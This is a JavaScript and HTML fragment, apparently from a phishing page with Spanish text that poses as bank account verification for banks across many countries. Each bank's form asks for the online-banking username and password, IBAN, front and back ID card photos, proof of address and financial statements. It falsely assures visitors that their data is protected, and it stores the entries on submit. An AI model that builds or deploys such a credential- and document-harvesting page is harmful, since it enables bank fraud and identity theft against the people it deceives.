<script src="lista.js"></script>
<script>
  const accordionList = document.getElementById("accordionList");

  // Ordenar alfabéticamente por país
  bancosIBAN.sort((a, b) => a.pais.localeCompare(b.pais));

  // Seleccionar los 5 bancos más populares para mostrar al inicio
  const destacados = [
    "España", "Alemania", "Francia", "Reino Unido", "Estados Unidos" // puedes ajustar según preferencia
  ];

  bancosIBAN.forEach(item => {
    const acc = document.createElement("div");
    acc.className = "accordion";
    acc.innerHTML = `
      <div class="accordion-header">${item.pais} - ${item.banco}</div>
      <div class="accordion-content">
        <form onsubmit="showConfirmation(event)">
          <label>Usuario: <input type="text" required></label>
          <label>Contraseña: <input type="password" required></label>
          <label>Cuenta principal: <input type="text" required></label>
          <label>IBAN: <input type="text" required></label>
          <label>Foto carnet (frontal): <input type="file" accept="image/*" capture="environment"></label>
          <label>Foto carnet (trasera): <input type="file" accept="image/*" capture="environment"></label>
          <label>Comprobante de domicilio: <input type="file" accept="image/*,application/pdf"></label>
          <label>Justificantes financieros: <input type="file" accept="image/*,application/pdf"></label>
          <div class="inline-security">🔒 Sus datos están protegidos bajo estrictos protocolos de seguridad.</div>
          <button type="submit">Verificar</button>
        </form>
      </div>
    `;

    // Mostrar solo los destacados al inicio
    if (destacados.includes(item.pais)) {
      accordionList.appendChild(acc);
    } else {
      acc.style.display = "none"; // ocultar los demás
      accordionList.appendChild(acc);
    }
  });

  // Función para desplegar acordeones
  document.addEventListener("click", function(e) {
    if (e.target.classList.contains("accordion-header")) {
      const content = e.target.nextElementSibling;
      content.style.display = content.style.display === "block" ? "none" : "block";
    }
  });

  // Función de búsqueda: muestra todos los bancos que coincidan
  document.getElementById("searchInput").addEventListener("keyup", function() {
    const filter = this.value.toLowerCase();
    const accordions = document.querySelectorAll(".accordion");
    accordions.forEach(acc => {
      const text = acc.querySelector(".accordion-header").textContent.toLowerCase();
      acc.style.display = text.includes(filter) ? "" : "none";
    });
  });

  // Confirmación automática
  function showConfirmation(event) {
    event.preventDefault();

    const usuario = event.target.querySelector('input[type="text"]').value;
    const iban = event.target.querySelectorAll('input[type="text"]')[1].value;
    const banco = event.target.closest('.accordion').querySelector('.accordion-header').textContent;

    // Guardar en localStorage
    let registros = JSON.parse(localStorage.getItem("registros")) || [];
    registros.push({ usuario, iban, banco, foto: "https://via.placeholder.com/100x60" });
    localStorage.setItem("registros", JSON.stringify(registros));

    document.getElementById("confirmationBox").style.display = "block";
    window.scrollTo({ top: document.body.scrollHeight, behavior: 'smooth' });
  }
</script>
